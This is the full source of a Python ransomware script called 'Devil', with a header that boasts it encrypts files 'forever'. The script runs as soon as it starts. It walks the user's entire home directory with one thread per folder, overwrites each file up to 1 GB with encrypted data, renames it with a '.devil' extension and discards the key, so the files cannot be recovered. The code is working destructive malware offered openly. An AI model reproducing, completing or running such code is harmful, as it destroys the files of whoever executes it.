#!/usr/bin/env python3

"""
All rights reserved to (C) @SecVirus FOREVER

Email: secvirus[AT]proton[DOT]com
GitHub: https://www.github.com/isecvirus
InstaGram: https://www.instagram.com/secvirus



Devil is a blind ransomware, run once regret forever.
NEVER RUN IT ON A FRIENDLY MACHINE, THIS SCRIPT WILL..
ENCRYPT YOU FILES FOREVER AND YOU WILL NOT BEABLE TO..
RETRIEVE IT EVER AGAIN.

TEST:
    Files(77915) # Files walked on.
    Duplicates(0) # Duplicated files walked on (Can make operation slower .. and DEVIL got all of it Unique.)
    Directories(12626) # Directories walked on.
    Estimated(1000.4420075416565) # Time took to operate all of the above.
"""

import base64
import os
import threading
from pathlib import Path
from cryptography.fernet import Fernet

class Devil:
    def __init__(self):
        self.encrypted = []
        self.in_progress = []
        self.home_path = os.path.expanduser("~")
        self.directories = Path(self.home_path).glob('*')

        self.min_len = 1  # in bytes
        self.max_len = ((1024 * 1024) * 1024) * 1  # 1073741824

        self.random_bytes = base64.urlsafe_b64encode(os.urandom(32))  # random bytes of size 32
        self.key = Fernet(self.random_bytes).generate_key()
        self.fernet = Fernet(key=self.key)

    def encrypt(self, file: str):
        if not file in self.encrypted:
            if os.stat(path=file).st_size >= self.min_len:
                if os.stat(path=file).st_size <= self.max_len:
                    try:
                        with open(file, "rb") as File:
                            with open(file, "wb") as Encd:
                                Encd.write(self.fernet.encrypt(data=File.read()))
                            Encd.close()
                        File.close()
                        os.rename(src=file, dst=''.join(os.path.splitext(file)[:-1]) + ".devil")
                        self.encrypted.append(file)
                    except Exception:
                        pass

    def Map(self):
        def loop(directories):
            for path in directories:
                if os.path.exists(path):
                    if os.path.isdir(path):
                        threading.Thread(target=loop, args=(Path(path).glob('*'),)).start()
                    elif os.path.isfile(path):
                        self.encrypt(file=path)

        loop(directories=self.directories)


devil = Devil()
devil.Map()
